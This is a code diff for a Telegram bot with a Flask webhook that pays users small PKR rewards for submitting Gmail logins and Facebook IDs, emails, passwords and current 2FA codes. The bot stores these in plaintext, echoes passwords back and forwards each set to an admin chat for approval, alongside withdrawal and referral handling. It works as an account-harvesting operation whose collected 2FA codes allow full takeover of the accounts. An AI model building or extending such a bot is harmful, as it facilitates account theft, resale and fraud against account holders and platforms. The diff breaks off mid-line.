@@ -10,7 +10,7 @@ from flask import Flask, request
 # ------------------------------
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "0"))
-WEBHOOK_URL = os.environ.get("WEBHOOK_URL")  # e.g. https://your-app.onrender.com
+WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
 
 if not BOT_TOKEN or not WEBHOOK_URL:
     raise RuntimeError("BOT_TOKEN and WEBHOOK_URL must be set in environment variables")
@@ -19,7 +19,7 @@ bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
 app = Flask(__name__)
 
 # ------------------------------
-# In-memory storage (replace with DB later)
+# In-memory storage
 # ------------------------------
 users = {}
 
@@ -31,8 +31,6 @@ FB_TASK_REWARD = 12
 WITHDRAW_MIN_PKR = 200
 BINANCE_PKR_PER_USD = 300
 BINANCE_MIN_USD = 1
-WITHDRAW_PROCESSING_HOURS = 5
-TASK_USER_PROCESSING_MINUTES = 30
 
 # ------------------------------
 # Helpers
@@ -168,7 +166,7 @@ def handle_task_choice(call):
         bot.send_message(uid, "Send Facebook details:\n`fb_id fb_email fb_password 2fa_code`")
 
 # ------------------------------
-# Text handler (Updated: check menus first, then states)
+# Text handler
 # ------------------------------
 @bot.message_handler(func=lambda m: True)
 def handle_text(message):
@@ -179,34 +177,30 @@ def handle_text(message):
     text = message.text.strip()
     text_lower = text.lower()
 
-    # --- MENU COMMANDS FIRST ---
+    # Menu commands
     if text_lower in ["💼 balance", "balance"]:
         bot.send_message(uid, f"💼 Balance: {u.get('balance',0)} PKR\n🔒 Hold: {u.get('hold',0)} PKR\n✅ Tasks Completed: {u.get('tasks_completed',0)}")
         return
-
     if text_lower in ["💰 withdraw", "withdraw"]:
-        users[uid]["state"] = None
+        u["state"] = None
         bot.send_message(uid, "Choose withdrawal method:", reply_markup=withdraw_methods_markup())
         return
-
     if text_lower in ["📝 tasks", "tasks"]:
         bot.send_message(uid, "Choose a task type:", reply_markup=tasks_menu())
         return
-
     if text_lower in ["/referral", "🔗 referral link"] or text_lower.startswith("referral"):
         link = f"https://t.me/{bot.get_me().username}?start={uid}"
         bot.send_message(uid, f"Share this link. Earn {REFERRAL_BONUS_PER_TASK} PKR per approved task.\n\n{link}")
         return
 
-    # --- STATE HANDLING ---
+    # Withdraw amount input
     if state and state.startswith("awaiting_withdraw_"):
-        method = state.split("_", 2)[2]
+        method = state.split("_",2)[2]
         try:
             amt = float(text)
         except ValueError:
             bot.send_message(uid, "Invalid amount. Please enter a numeric value.")
             return
-
         if method == "binance":
             if amt < BINANCE_MIN_USD:
                 bot.send_message(uid, f"Minimum for Binance is {BINANCE_MIN_USD} USD.")
@@ -216,7 +210,7 @@ def handle_text(message):
                 bot.send_message(uid, f"Insufficient balance. You have {u['balance']} PKR, need {required_pkr} PKR.")
                 return
             u["state"] = f"awaiting_withdraw_account_binance"
-            u["withdraw_temp"] = {"method": "binance", "usd_amount": amt, "pkr_amount": required_pkr}
+            u["withdraw_temp"] = {"method":"binance","usd_amount":amt,"pkr_amount":required_pkr}
             bot.send_message(uid, "Enter your Binance account email or ID for USD transfer:")
         else:
             if amt < WITHDRAW_MIN_PKR:
@@ -226,10 +220,11 @@ def handle_text(message):
                 bot.send_message(uid, f"Insufficient balance. You have {u['balance']} PKR.")
                 return
             u["state"] = f"awaiting_withdraw_account_{method}"
-            u["withdraw_temp"] = {"method": method, "pkr_amount": int(amt)}
+            u["withdraw_temp"] = {"method":method,"pkr_amount":int(amt)}
             bot.send_message(uid, f"Enter your {method} account details for withdrawal:")
         return
 
+    # Withdraw account input
     if state and state.startswith("awaiting_withdraw_account_"):
         temp = u.get("withdraw_temp", {})
         temp["account_info"] = text
@@ -250,51 +245,48 @@ def handle_text(message):
             pkr = temp["pkr_amount"]
             u["balance"] -= pkr
             u["hold"] += pkr
-
-        admin_text = f"💸 Withdraw Request ({req['method'].title()})\nUser: `{uid}`\nAmount: {pkr} PKR\nAccount: {temp['account_info']}\nProcessing time: {WITHDRAW_PROCESSING_HOURS} hours"
+        admin_text = f"💸 Withdraw Request ({req['method'].title()})\nUser: `{uid}`\nAmount: {pkr} PKR\nAccount: {temp['account_info']}"
         admin_markup = types.InlineKeyboardMarkup()
         admin_markup.add(
             types.InlineKeyboardButton("✅ Approve Withdraw", callback_data=f"approve_wd_{len(u['withdraw_requests'])-1}_{uid}"),
             types.InlineKeyboardButton("❌ Reject Withdraw", callback_data=f"reject_wd_{len(u['withdraw_requests'])-1}_{uid}")
         )
         admin_notify(admin_text, markup=admin_markup)
-        bot.send_message(uid, f"✅ Withdraw request received. It will be processed in {WITHDRAW_PROCESSING_HOURS} hours.")
+        bot.send_message(uid, f"✅ Withdraw request received. Processing will start soon.")
         u["state"] = None
         u.pop("withdraw_temp", None)
         return
 
-    # --- Tasks input ---
+    # Tasks input
     if state == "awaiting_own_gmail":
         parts = text.split()
-        if len(parts) < 2:
-            bot.send_message(uid, "Invalid format. Send: `email password`", parse_mode="Markdown")
+        if len(parts)<2:
+            bot.send_message(uid,"Invalid format. Send: `email password`", parse_mode="Markdown")
             return
-        email = parts[0]
-        password = " ".join(parts[1:])
-        users[uid]["current_task"] = {"type":"own","email":email,"password":password,"reward":OWN_TASK_REWARD,"status":"pending"}
-        users[uid]["state"] = None
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("✅ Done Task", callback_data="done_task"))
-        markup.add(types.InlineKeyboardButton("❌ Cancel Task", callback_data="cancel_task"))
-        bot.send_message(uid, f"Gmail saved.\nEmail: `{email}`\nPassword: `{password}`\nPress Done when ready.", parse_mode="Markdown", reply_markup=markup)
+        email,password = parts[0]," ".join(parts[1:])
+        users[uid]["current_task"]={"type":"own","email":email,"password":password,"reward":OWN_TASK_REWARD,"status":"pending"}
+        users[uid]["state"]=None
+        markup=types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("✅ Done Task",callback_data="done_task"))
+        markup.add(types.InlineKeyboardButton("❌ Cancel Task",callback_data="cancel_task"))
+        bot.send_message(uid,f"Gmail saved.\nEmail: `{email}`\nPassword: `{password}`\nPress Done when ready.",parse_mode="Markdown",reply_markup=markup)
         return
 
     if state == "awaiting_fb_details":
         parts = text.split()
-        if len(parts) < 4:
-            bot.send_message(uid, "Invalid format. Send: `fb_id fb_email fb_password 2fa_code`")
+        if len(parts)<4:
+            bot.send_message(uid,"Invalid format. Send: `fb_id fb_email fb_password 2fa_code`")
             return
         fb_id, fb_email, fb_password, fb_2fa = parts[:4]
-        users[uid]["current_task"] = {"type":"facebook","fb_id":fb_id,"email":fb_email,"password":fb_password,"2fa":fb_2fa,"reward":FB_TASK_REWARD,"status":"pending"}
-        users[uid]["state"] = None
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("✅ Done Task", callback_data="done_task"))
-        markup.add(types.InlineKeyboardButton("❌ Cancel Task", callback_data="cancel_task"))
-        bot.send_message(uid, "Facebook info saved. Press Done when ready.", reply_markup=markup)
+        users[uid]["current_task"]={"type":"facebook","fb_id":fb_id,"email":fb_email,"password":fb_password,"2fa":fb_2fa,"reward":FB_TASK_REWARD,"status":"pending"}
+        users[uid]["state"]=None
+        markup=types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("✅ Done Task",callback_data="done_task"))
+        markup.add(types.InlineKeyboardButton("❌ Cancel Task",callback_data="cancel_task"))
+        bot.send_message(uid,"Facebook info saved. Press Done when ready.",reply_markup=markup)
         return
 
-    # Fallback
-    bot.send_message(uid, "I didn't understand that. Use the menu or press /start.", reply_markup=main_menu())
+    bot.send_message(uid,"I didn't understand that. Use menu or /start.",reply_markup=main_menu())
 
 # ------------------------------
 # Callback handler
@@ -309,53 +301,93 @@ def callback_query(call):
     if data == "done_task":
         task = users[uid].get("current_task")
         if not task:
-            bot.answer_callback_query(call.id, "No active task!")
+            bot.answer_callback_query(call.id,"No active task!")
             return
         reward = task["reward"]
         users[uid]["hold"] += reward
         task["status"] = "pending_admin"
-        bot.answer_callback_query(call.id, "Task submitted. Processing (about 30 minutes).")
-        bot.send_message(uid, f"⏳ Your task is submitted. Approx {TASK_USER_PROCESSING_MINUTES} minutes.")
-        admin_markup = types.InlineKeyboardMarkup()
-        admin_markup.add(
-            types.InlineKeyboardButton("✅ Approve Task", callback_data=f"approve_task_{uid}"),
-            types.InlineKeyboardButton("❌ Reject Task", callback_data=f"reject_task_{uid}")
-        )
-        if task["type"] == "generated":
-            admin_text = f"📝 Task (Generated Gmail)\nUser: `{uid}`\nEmail: `{task['email']}`\nPassword: `{task['password']}`\nReward: {reward} PKR"
-        elif task["type"] == "own":
-            admin_text = f"📝 Task (User Gmail)\nUser: `{uid}`\nEmail: `{task['email']}`\nPassword: `{task['password']}`\nReward: {reward} PKR"
+        bot.answer_callback_query(call.id,"Task submitted. Waiting admin approval...")
+        admin_markup=types.InlineKeyboardMarkup()
+        admin_markup.add(types.InlineKeyboardButton("✅ Approve Task",callback_data=f"approve_task_{uid}"))
+        admin_markup.add(types.InlineKeyboardButton("❌ Reject Task",callback_data=f"reject_task_{uid}"))
+        if task["type"]=="generated":
+            admin_text=f"📝 Task (Generated Gmail)\nUser: `{uid}`\nEmail: `{task['email']}`\nPassword: `{task['password']}`\nReward: {reward} PKR"
+        elif task["type"]=="own":
+            admin_text=f"📝 Task (User Gmail)\nUser: `{uid}`\nEmail: `{task['email']}`\nPassword: `{task['password']}`\nReward: {reward} PKR"
         else:
-            admin_text = f"📝 Task (Facebook 2FA)\nUser: `{uid}`\nFB ID: `{task.get('fb_id')}`\nEmail: `{task.get('email')}`\nPassword: `{task.get('password')}`\n2FA: `{task.get('2fa')}`\nReward: {reward} PKR"
-        admin_notify(admin_text, markup=admin_markup)
+            admin_text=f"📝 Task (Facebook 2FA)\nUser: `{uid}`\nFB ID: `{task.get('fb_id')}`\nEmail: `{task.get('email')}`\nPassword: `{task.get('password')}`\n2FA: `{task.get('2fa')}`\nReward: {reward} PKR"
+        admin_notify(admin_text,markup=admin_markup)
         return
 
     if data == "cancel_task":
         if users[uid].get("current_task"):
-            users[uid]["current_task"] = None
-            users[uid]["state"] = None
-            bot.answer_callback_query(call.id, "Task canceled.")
-            bot.send_message(uid, "Task canceled.", reply_markup=main_menu())
+            users[uid]["current_task"]=None
+            users[uid]["state"]=None
+            bot.answer_callback_query(call.id,"Task canceled.")
+            bot.send_message(uid,"Task canceled.",reply_markup=main_menu())
         else:
-            bot.answer_callback_query(call.id, "No task to cancel.")
+            bot.answer_callback_query(call.id,"No task to cancel.")
         return
 
-    # Withdraw selections
-    if data.startswith("wd_"):
-        method = data.split("_",1)[1]
-        users[uid]["state"] = f"awaiting_withdraw_{method}"
-        if method == "binance":
-            bot.answer_callback_query(call.id, "Enter USD amount (min 1 USD).")
-            bot.send_message(uid, "Enter the USD amount to withdraw:")
-        else:
-            bot.answer_callback_query(call.id, f"Enter PKR amount (min {WITHDRAW_MIN_PKR}).")
-            bot.send_message(uid, f"Enter the amount in PKR:")
+    # Admin approve/reject task
+    if data.startswith("approve_task_") and call.message.chat.id==ADMIN_CHAT_ID:
+        target_uid=int(data.split("_")[-1])
+        task=users[target_uid].get("current_task")
+        if not task:
+            bot.answer_callback_query(call.id,"No task found for this user.")
+            return
+        reward=task["reward"]
+        users[target_uid]["hold"]-=reward
+        users[target_uid]["balance"]+=reward
+        users[target_uid]["tasks_completed"]+=1
+        task["status"]="approved"
+        users[target_uid]["current_task"]=None
+        bot.send_message(target_uid,f"✅ Your task was approved! {reward} PKR added to your balance.")
+        bot.answer_callback_query(call.id,"Task approved.")
+        bot.send_message(ADMIN_CHAT_ID,f"✔ Approved task for user {target_uid}")
+        ref=users[target_uid].get("referrer")
+        if ref and ref in users:
+            users[ref]["balance"]+=REFERRAL_BONUS_PER_TASK
+            users[ref]["referral_earned"]+=REFERRAL_BONUS_PER_TASK
+            bot.send_message(ref,f"🎉 You earned {REFERRAL_BONUS_PER_TASK} PKR from referral's approved task (user {target_uid}).")
         return
 
-    # Admin approve/reject and task callbacks remain same (reuse your existing logic)
+    if data.startswith("reject_task_") and call.message.chat.id==ADMIN_CHAT_ID:
+        target_uid=int(data.split("_")[-1])
+        task=users[target_uid].get("current_task")
+        if task:
+            reward=task["reward"]
+            users[target_uid]["hold"]-=reward
+            users[target_uid]["current_task"]=None
+            task["status"]="rejected"
+            bot.send_message(target_uid,f"❌ Your task was rejected by admin.")
+            bot.answer_callback_query(call.id,"Task rejected.")
+            bot.send_message(ADMIN_CHAT_ID,f"✖ Rejected task for user {target_uid}")
+        return
 
-# ------------------------------
-# Flask run
-# ------------------------------
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
+    # Withdraw approve/reject (same logic)
+    if data.startswith("approve_wd_") and call.message.chat.id==ADMIN_CHAT_ID:
+        parts=data.split("_")
+        idx=int(parts[2])
+        target_uid=int(parts[3])
+        req=users[target_uid]["withdraw_requests"][idx]
+        req["status"]="approved"
+        pkr=req.get("pkr_amount",0)
+        users[target_uid]["hold"]-=pkr
+        bot.send_message(target_uid,f"✅ Your withdrawal of {pkr} PKR ({req['method']}) has been approved.")
+        bot.answer_callback_query(call.id,"Withdraw approved.")
+        bot.send_message(ADMIN_CHAT_ID,f"✔ Approved withdraw for user {target_uid}")
+        return
+
+    if data.startswith("reject_wd_") and call.message.chat.id==ADMIN_CHAT_ID:
+        parts=data.split("_")
+        idx=int(parts[2])
+        target_uid=int(parts[3])
+        req=users[target_uid]["withdraw_requests"][idx]
+        req["status"]="rejected"
+        pkr=req.get("pkr_amount",0)
+        users[target_uid]["hold"]-=pkr
+        users[target_uid]["balance"]+=pkr
+        bot.send_message(target_uid,f"❌ Your withdrawal was rejected. {pkr} PKR refunded to balance.")
+        bot.answer_callback_query(call.id,"Withdraw rejected and refunded.")
+        bot.send
